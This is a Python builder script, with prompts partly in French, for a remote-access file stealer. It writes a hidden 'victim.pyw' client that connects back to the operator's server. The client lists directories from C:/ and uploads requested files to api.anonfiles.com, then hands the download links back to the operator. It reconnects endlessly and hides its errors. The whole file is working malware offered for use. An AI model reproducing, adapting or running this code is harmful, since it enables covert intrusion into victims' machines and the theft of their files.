from src.manager import LaunchServer
from src.tui import Col, Tui

from socket import gethostname, gethostbyname


def mkcode(host: str, port: str) -> str:
    code = r'''
from socket import socket, AF_INET, SOCK_STREAM, setdefaulttimeout
from json import dumps, loads
from time import sleep
from requests import post
from os import listdir
from os.path import isfile



host = "''' + host + r'''"
port = ''' + str(port) + r'''

delay = 1


class Client:
    def __init__(self, host: str, port: int) -> None:
        self.client = socket(AF_INET, SOCK_STREAM)
        
        self.host, self.port = host, port

        setdefaulttimeout(9999)
        
        self.Connect()

    def Connect(self) -> None:
        try:
            self.client.connect((self.host, self.port))
        except:
            self.Reconnect()

        path = 'C:/'
        method = 'DIR'

        while True:
            try:
                self.Send(method=method, path=path)
                method, path = self.Recv()
            except:
                self.Reconnect()
    
    def Reconnect(self) -> None:
        sleep(delay)
        try:
            self.client.close()
            self.client = socket(AF_INET, SOCK_STREAM)
        except:
            pass
        while True:
            try:
                self.Connect()
            except:
                pass


    def Recv(self) -> tuple:
        """
        {
            "method": "FILE" or "DIR"
            "path" : "PATH"
        }
        """

        json = loads(self.client.recv(4096))
        return json['method'], json['path']

    
    def Send(self, method: str, path: str) -> None:
        """
        {
            "method": "FILE" or "DIR"
            "path" : "PATH"
            "content": "anonfiles_link" or "listdir(dir)"
        }
        """

        json = {
            'method': method,
            'path': path,
            'content': self.Dir(path=path) if method == 'DIR' else self.File(path=path)
            }

        return self.client.send(dumps(json).encode('utf-8'))
        

    def File(self, path: str) -> str:
        try:
            path = path.rstrip('/')
            FileName = path.split("/")
            FileName = FileName[len(FileName)-1]

            files = {
                "file": (path, open(path, mode='rb'))
            }

            upload = post("https://api.anonfiles.com/upload", files=files)
            x = upload.json()
            url = x["data"]["file"]["url"]["full"].rstrip('/')
            return url
        except:
            return 'False'

    
    def Dir(self, path: str) -> dict:
        try:
            dir = listdir(path)
            ndir = {}
            for e in dir:
                if isfile(path + e):
                    ndir[e] = 'FILE'
                else:
                    ndir[e] = 'DIR'
            return ndir
        except:
            return 'False'


Client(host=host, port=port)'''
    return code


def main():
    Tui.MainPrint()

    host = input(f"{Tui.q} {Col.dark_red}Enter the host (press {Col.light_red}'{Col.gray}enter{Col.light_red}'{Col.dark_red} for your local ip address) {Col.light_red}-> {Col.gray}")

    if host == '':
        hostname = gethostname()
        local_ip = gethostbyname(hostname)
        host = local_ip

    print()

    port = input(f"{Tui.q} {Col.dark_red}Enter the port (press {Col.light_red}'{Col.gray}enter{Col.light_red}'{Col.dark_red} for {Col.light_red}'{Col.gray}5000{Col.light_red}'{Col.dark_red}) {Col.light_red}-> {Col.gray}")

    print('\n')
    if port == '':
        port = '5000'
    try:
        port = int(port)
    except ValueError:
        input(f"{Tui.t} {Col.dark_red}Error! Port has to be an integer.{Col.gray}" + Col.gray)
        return
    
    if port < 1 or port > 65535:
        input(f"{Tui.t} {Col.dark_red}Error! Port has to be between {Col.light_red}'{Col.gray}1{Col.light_red}'{Col.dark_red} and {Col.light_red}'{Col.gray}65535{Col.light_red}'{Col.gray}")
        return

    with open('victim.pyw', mode='w', encoding='utf-8') as f:
        f.write(mkcode(host=host, port=port))

    input(f"{Tui.p} {Col.dark_red}le fichier {Col.light_red}'{Col.gray}victim.pyw{Col.light_red}'{Col.dark_red} a bien ete crée. Pressez {Col.light_red}'{Col.gray}entré{Col.light_red}'{Col.dark_red} to start the server at {Col.light_red}'{Col.gray}{host}{Col.light_red}:{Col.gray}{port}{Col.light_red}'{Col.dark_red}...{Col.gray}")

    try:
        LaunchServer(host=host, port=port)
    except Exception as e:
        input(f"\n{Tui.t} {Col.dark_red}Erreur: {Col.light_red}'{Col.gray}{e}{Col.light_red}'{Col.gray}")



if __name__ == '__main__':
    main()